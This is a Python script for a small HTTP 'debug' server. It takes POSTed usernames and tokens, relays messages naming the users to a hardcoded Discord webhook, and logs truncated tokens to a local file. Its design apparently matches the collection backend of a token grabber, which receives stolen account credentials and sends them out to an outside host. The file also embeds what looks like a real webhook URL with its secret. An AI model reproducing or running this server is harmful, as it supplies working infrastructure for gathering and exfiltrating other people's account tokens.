from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.request
import urllib.error

# REPLACE WITH YOUR NEW WEBHOOK
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1457853928082247785/sbu1wSV0HVvimlh0CZhvhRpnAoX90fj6eMfN2SUHw6Gfh2FsVulYaeM4A2Ely-quGs94"

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            # Get data
            length = int(self.headers['Content-Length'])
            data = json.loads(self.rfile.read(length).decode())
            
            username = data.get('username', 'Unknown')
            token = data.get('token', '')
            
            print(f"Got: {username}")
            
            # TEST 1: Simple message
            print("Test 1: Sending 'Hello' to Discord...")
            try:
                simple = json.dumps({"content": "Hello from server"}).encode()
                req1 = urllib.request.Request(DISCORD_WEBHOOK, data=simple, 
                                             headers={'Content-Type': 'application/json'})
                resp1 = urllib.request.urlopen(req1, timeout=5)
                print(f"✓ Test 1 passed: {resp1.status}")
            except urllib.error.HTTPError as e:
                print(f"✗ Test 1 failed: {e.code} {e.reason}")
                print(f"Response: {e.read().decode()}")
            
            # TEST 2: Embed without token
            print("Test 2: Sending embed (no token)...")
            try:
                embed = {"title": "Test", "description": f"User: {username}", "color": 65280}
                embed_data = json.dumps({"embeds": [embed]}).encode()
                req2 = urllib.request.Request(DISCORD_WEBHOOK, data=embed_data,
                                             headers={'Content-Type': 'application/json'})
                resp2 = urllib.request.urlopen(req2, timeout=5)
                print(f"✓ Test 2 passed: {resp2.status}")
            except urllib.error.HTTPError as e:
                print(f"✗ Test 2 failed: {e.code} {e.reason}")
                print(f"Response: {e.read().decode()}")
            
            # Save to file (always works)
            with open('received.txt', 'a') as f:
                f.write(f"{username}: {token[:10]}...\n")
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
            
        except Exception as e:
            print(f"Server error: {e}")
            self.send_response(500)
            self.end_headers()
    
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'DEBUG SERVER RUNNING')

print("DEBUG Server starting on port 5000")
server = HTTPServer(('0.0.0.0', 5000), Handler)
server.serve_forever()
